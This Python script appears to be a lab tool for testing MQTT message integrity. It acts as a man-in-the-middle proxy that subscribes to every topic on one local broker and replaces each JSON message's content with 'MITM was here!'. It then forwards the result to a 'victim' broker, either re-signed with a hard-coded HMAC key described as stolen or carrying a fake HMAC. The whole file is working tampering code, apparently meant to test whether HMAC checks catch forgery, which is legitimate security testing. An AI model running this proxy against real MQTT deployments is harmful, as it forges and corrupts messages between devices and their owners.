import paho.mqtt.client as mqtt
import json
import hmac
import hashlib

# --- Configuration ---
# The port the MITM broker will listen on
MITM_BROKER_PORT = 1891

# The real victim broker's (B6) address
VICTIM_HOST = "127.0.0.1"
VICTIM_PORT = 1889

# --- SET THIS TO 'True' or 'False' TO TEST BOTH SCENARIOS ---
ATTACKER_KNOWS_KEY = False
HMAC_SECRET_KEY = b"4c1c4d7e2b9f7a0e8b6d3e5f1a2c7b4d" # The same key from your .conf


# This function is called when a message is intercepted on the MITM_BROKER
def on_mitm_message(client, userdata, msg):
    print(f"--- [MITM] Message Intercepted from B5 on Topic: {msg.topic} ---")
    
    try:
        original_payload = msg.payload.decode()
        print(f"[MITM] Original Payload: {original_payload}")

        # --- The Attack: Modify the Payload ---
        payload_json = json.loads(original_payload)
        
        if "message" in payload_json:
            payload_json["message"] = "MITM was here!"
            print("[MITM] >>> Payload 'message' field modified!")

        if "hmac" in payload_json:
            del payload_json["hmac"]

        modified_payload_no_hmac = json.dumps(payload_json, separators=(',', ':'))
        
        final_payload_to_send = ""

        if ATTACKER_KNOWS_KEY:
            # SCENARIO A: Attacker has the key
            print("[MITM] >>> Re-signing payload with STOLEN secret key...")
            new_hmac = hmac.new(HMAC_SECRET_KEY, modified_payload_no_hmac.encode(), hashlib.sha256).hexdigest()
            payload_json["hmac"] = new_hmac
            final_payload_to_send = json.dumps(payload_json)
        else:
            # SCENARIO B: Attacker does NOT have the key
            print("[MITM] >>> Forwarding with a FAKE HMAC.")
            payload_json["hmac"] = "tamperedhmac123" 
            final_payload_to_send = json.dumps(payload_json)

        print(f"[MITM] Forwarding Tampered Payload: {final_payload_to_send}\n")
        
        # Forward the modified message to the real victim (B6)
        victim_client.publish(msg.topic, final_payload_to_send)

    except Exception as e:
        print(f"[MITM] Error processing message: {e}")


# --- Setup ---
# Client to connect to the REAL VICTIM broker (B6)
victim_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "VictimForwarder_B6")
victim_client.connect(VICTIM_HOST, VICTIM_PORT, 60)
victim_client.loop_start()

# Client to connect to the MITM BROKER to intercept
mitm_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, "MITM-Listener_B5")
mitm_client.on_message = on_mitm_message
mitm_client.connect("127.0.0.1", MITM_BROKER_PORT, 60)
mitm_client.subscribe("#", qos=0)

print(f"[*] MITM Proxy Script Running...")
print(f"[*] Intercepting on port {MITM_BROKER_PORT} (for B5)")
print(f"[*] Forwarding to {VICTIM_HOST}:{VICTIM_PORT} (the real B6)")
print(f"[*] Attacker knows secret key: {ATTACKER_KNOWS_KEY}\n")

try:
    mitm_client.loop_forever()
except KeyboardInterrupt:
    print("\n[MITM] Shutting down proxy.")
    victim_client.loop_stop()
    mitm_client.loop_stop()